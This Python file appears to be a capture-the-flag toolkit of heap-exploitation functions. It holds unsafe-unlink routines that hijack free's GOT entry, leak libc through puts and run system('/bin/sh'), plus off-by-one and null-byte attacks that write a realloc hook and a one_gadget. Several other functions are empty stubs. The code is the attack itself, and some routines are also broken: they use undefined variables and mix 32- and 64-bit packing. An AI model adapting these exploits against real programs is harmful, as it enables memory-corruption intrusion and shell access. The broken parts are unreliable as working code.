#!/usr/bin/env python
def unlink64(chunk_start_index,chunk_list):
    add(0x20)
    add(0x38)
    add(0x98)
    add(0x20)
    fd = chunk_list+8 - 0x18
    bk = chunk_list+8 - 0x10
    payload = p64(0) + p64(0x30)
    payload += p64(fd) + p64(bk)
    payload += "a"*0x10
    payload += p64(0x30) + p8(0)
    wr(chunk_start_index+1,payload)
    rm(chunk_start_index+2)
    free_got = elf.got["free"]
    puts_got = elf.got["puts"]
    puts_plt = elf.plt["puts"]
    payload2 = "a"*0x10 
    payload2 += p64(free_got) + p64(puts_got)
    wr(chunk_start_index+1,payload2)
    payload3 = p64(puts_plt)
    wr(chunk_start_index+0,payload3)
    free(chunk_start_index+1)
    puts_addr = u64(sh.recvuntil("\nOK\n",drop = True).ljust(8,'\x00'))
    print hex(puts_addr)
    puts_offset = libc.symbols["puts"]
    system_offset = libc.symbols["system"]
    libc_base = puts_addr - puts_offset
    system_addr = libc_base + system_offset
    payload4 = p64(system_addr)
    #payload4 = p64(0x000000000004526a)
    wr(1,payload4)
    raw_input("wait")
    wr(chunk_start_index+3,"/bin/sh\00")
    free(chunk_start_index+3)
 
def unlink32(chunk_start_index,chunk_list):
    add(0x20)
    add(0x3c)
    add(0x98)
    add(0x20)
    fd = chunk_list+4 - 0x18
    bk = chunk_list+4 - 0x10
    payload = p32(0) + p32(0x30)
    payload += p32(fd) + p32(bk)
    payload += "a"*0x14
    payload += p32(0x30) + p8(0)
    wr(chunk_start_index+1,payload)
    rm(chunk_start_index+2)
    free_got = elf.got["free"]
    puts_got = elf.got["puts"]
    puts_plt = elf.plt["puts"]
    payload2 = "a"*0x10 
    payload2 += p32(free_got) + p32(puts_got)
    wr(chunk_start_index+1,payload2)
    payload3 = p32(puts_plt)
    wr(chunk_start_index+0,payload3)
    free(chunk_start_index+1)
    puts_addr = u32(sh.recvuntil("\nOK\n",drop = True).ljust(4,'\x00'))
    print hex(puts_addr)
    puts_offset = libc.symbols["puts"]
    system_offset = libc.symbols["system"]
    libc_base = puts_addr - puts_offset
    system_addr = libc_base + system_offset
    payload4 = p32(system_addr)
    #payload4 = p64(0x000000000004526a)
    wr(chunk_start_index+1,payload4)
    raw_input("wait")
    wr(chunk_start_index+3,"/bin/sh\00")
    free(chunk_start_index+3)
def ofo64(chunk_start_index,one_gadget,reallc):
    #off by one
    add(0x28)
    add(0x200)
    wr(chunk_start_index+1,'a'*0x190+p64(0x200)+p64(0x140))
    add(0x80)
    add(0x20)
    rm(chunk_start_index+1)
    wr(chunk_start_index,a*0x28+p8(0))
    add(0x80)
    add(0x60)
    rm(chunk_start_index+1)
    rm(chunk_start_index+2)
    rm(chunk_start_index+4)
    add(0x290)
    wr(chunk_start_index+1,'a'*0x80+p64(0)+p64(0x71)+p64(fd))
    add(0x60)
    add(0x60)
    wr(chunk_start_index+2,padlen*'a'+p64(reallc)+p64(one_gadget))
    add(0x30)
def null32(chunk_start_index,one_gadget,reallc):
    add(0x2c)
    add(0x208)
    wr(chunk_start_index+1,'a'*0x198+p32(0x200)+p64(0x130))
    add(0x80)
    add(0x20)
    rm(chunk_start_index+1)
    wr(chunk_start_index,a*0x28+p8(0))
    add(0x80)
    add(0x20)
    rm(chunk_start_index+1)
    rm(chunk_start_index+2)
    rm(chunk_start_index+4)
    add(0x290)
    wr(chunk_start_index+1,'a'*0x80+p32(0)+p32(0x71)+p32(fd))
    add(0x60)
    add(0x60)
    wr(chunk_start_index+2,padlen*'a'+p32(reallc)+p32(one_gadget))
    add(0x30)   
def top_chunk():
    pass
def std_leak():
    pass
def double_free():    
    pass
def vtable():
    pass
def make_con_leak(chunk_start_index):
    add(0x10)
    rm(chunk_start_index)
    add(0x20)
    rm(chunk_start_index)
    add(0x100)
    rm(chunk_start_index)
    add(0x10)
    sw(chunk_start_index)